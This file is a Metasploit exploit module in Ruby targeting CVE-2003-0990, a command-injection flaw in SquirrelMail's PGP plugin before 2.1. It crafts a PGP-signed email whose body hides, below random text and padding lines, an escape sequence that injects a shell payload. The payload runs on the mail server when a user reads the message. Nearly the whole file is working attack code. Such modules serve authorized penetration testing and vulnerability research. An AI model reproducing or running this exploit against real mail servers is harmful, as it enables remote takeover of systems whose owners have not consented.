##
# $Id: squirrelmail_pgp_plugin.rb 10148 2010-08-25 20:31:46Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ManualRanking

	#
	# This module sends email messages via smtp
	#
	include Msf::Exploit::Remote::SMTPDeliver

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SquirrelMail PGP Plugin command execution (SMTP)',
			'Description'    => %q{
					This module exploits a command execution vulnerability in the
				PGP plugin of SquirrelMail. This flaw was found while quickly
				grepping the code after release of some information at
				http://www.wslabi.com/. Later, iDefense published an advisory ....

				Reading an email in SquirrelMail with the PGP plugin activated
				is enough to compromise the underlying server.

				Only "cmd/unix/generic" payloads were tested.
			},
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10148 $',
			'Author'         => [ 'Nicob <nicob[at]nicob.net>' ],
			'References'     =>
				[
					['CVE', '2003-0990'],
					['OSVDB', '3178'],
					['URL', 'http://lists.immunitysec.com/pipermail/dailydave/2007-July/004456.html'],
					['URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=330'],
					['URL', 'http://www.wslabi.com/wabisabilabi/initPublishedBid.do?'],
				],
			'Stance'         => Msf::Exploit::Stance::Passive,
			'Platform'       => 'unix',
			'Arch'           => ARCH_CMD,
			'Payload'        =>
				{
					'Space'       => 1024,
					'BadChars'    => '',
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl ruby bash telnet',
						}
				},
			'Targets'        =>
				[
					[ 'SquirrelMail PGP plugin < 2.1', {} ],
				],
			'DisclosureDate' => 'Jul 9 2007',
			'DefaultTarget' => 0))

	end

	def mime_defaults()
		self.header.set("MIME-Version", "1.0")
		self.header.set("Content-Type", "multipart/signed; boundary=\"#{self.bound}\"; protocol=\"application/pgp-signature\"; micalg=pgp-sha1")
		self.header.set("Subject", '') # placeholder
		self.header.set("Date", Time.now.strftime("%a,%e %b %Y %H:%M:%S %z"))
		self.header.set("Message-ID",
			"<"+
			Rex::Text.rand_text_alphanumeric(rand(20)+40)+
			"@"+
			Rex::Text.rand_text_alpha(rand(20)+3)+
			">"
			)
		self.header.set("From", '')    # placeholder
		self.header.set("To", '')      # placeholder
	end

	def exploit

		body =
			# Display some junk
			rand_text_alphanumeric(rand(128)+16) + "\n" +
			rand_text_alphanumeric(rand(128)+16) + "\n" +
			rand_text_alphanumeric(rand(128)+16) + "\n" +
			rand_text_alphanumeric(rand(128)+16) + "\n" +
			rand_text_alphanumeric(rand(128)+16) + "\n" +
			rand_text_alphanumeric(rand(128)+16) + "\n" +

			# Scroll down
			"\n" * (rand(100)+35) +

			# Escape filter and insert payload
			"AAAA\\\";" + payload.encoded + ";echo \\\"BBBBB\n"

		sig =
			"-----BEGIN PGP SIGNATURE-----\nVersion: GnuPG\n\n " +
			rand_text_alphanumeric(rand(20)+54) + "\n" +
			rand_text_alphanumeric(rand(20)+34) + "\n" +
			"-----END PGP SIGNATURE-----\n"

		msg = Rex::MIME::Message.new
		msg.extend(MessageExtend)
		msg.mime_defaults
		msg.subject = datastore['SUBJECT'] || Rex::Text.rand_text_alpha(rand(32)+1)
		msg.to = datastore['MAILTO']
		msg.from = datastore['MAILFROM']

		msg.add_part(body, "text/plain;charset=us-ascii;format=flowed", "quoted-printable", nil)
		msg.add_part(sig, "application/pgp-signature", nil, "attachment; filename=signature.asc")

		send_message(msg.to_s)

		print_status("Waiting for a payload session (backgrounding)...")
	end

end
